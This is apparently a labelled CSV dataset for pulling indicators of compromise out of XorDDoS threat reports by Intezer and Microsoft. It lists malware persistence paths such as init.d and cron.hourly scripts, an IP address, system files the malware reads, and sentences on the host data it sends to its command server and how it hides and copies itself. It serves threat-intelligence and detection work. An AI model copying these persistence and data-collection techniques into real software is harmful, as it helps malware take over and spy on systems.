report,word,verb,objectType,prettyReg,match,label,sentence
Xorddos-Intezer.csv,/usr/syno/etc/rc.d/s99po1kitd-update.sh,,FILE,/etc/rc,0,0,
Xorddos-Intezer.csv,158.247.208.230,,NET,ip_addr,0,0,
Xorddos-Intezer.csv,127.0.0.1,hardcode,NET,ip_addr,0,0,table 2: data collected by the malware and sent back to the c2 server url key	description	comment hostip	ip	hardcoded to 127.0.0.1 softtype		hardcoded to “linux” pscaddr	mac address	 hostname	machine name	 hosttar	username	possibly “host target” hostos	distribution	extracted from /etc/issue or /etc/redhat-release hostcpu	clock speed	/proc/cpuinfo hostmem	amount of memory	/proc/meminfo hostpack		hardcoded to “linux” lkmtag	is rootkit enabled	 kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.
Xorddos-Intezer.csv,/proc/cpuinfo,extract,FILE,/proc/,1,1,table 2: data collected by the malware and sent back to the c2 server url key	description	comment hostip	ip	hardcoded to 127.0.0.1 softtype		hardcoded to “linux” pscaddr	mac address	 hostname	machine name	 hosttar	username	possibly “host target” hostos	distribution	extracted from /etc/issue or /etc/redhat-release hostcpu	clock speed	/proc/cpuinfo hostmem	amount of memory	/proc/meminfo hostpack		hardcoded to “linux” lkmtag	is rootkit enabled	 kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.
Xorddos-Intezer.csv,uid,,INFO,UID(\$|\.|$),0,0,
Xorddos-Intezer.csv,gid,,INFO,GID(\$|\.|$),0,0,
Xorddos-Intezer.csv,/etc/init.d/po1kitd-update,,FILE,/etc/init.d/,0,0,
Xorddos-Ms.csv,/etc/cron.hourly/gcc.sh\',,FILE,/etc/cron,0,0,
Xorddos-Ms.csv,/etc/rc<run_level>,,FILE,/etc/rc,0,0,
Xorddos-Ms.csv,/proc/rs_dev,use,FILE,/proc/,1,1, xorddos uses /proc/rs_dev character device to communicate with the rootkit.
Xorddos-Ms.csv,/proc/net/tcp,name,FILE,/proc/,0,0,"utilities, such as netstat, acquire tcp/udp connection information from files named /proc/net/tcp and /proc/net/udp."
Xorddos-Ms.csv,/var/run/.,create,FILE,/var/run/,1,1,"if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/."
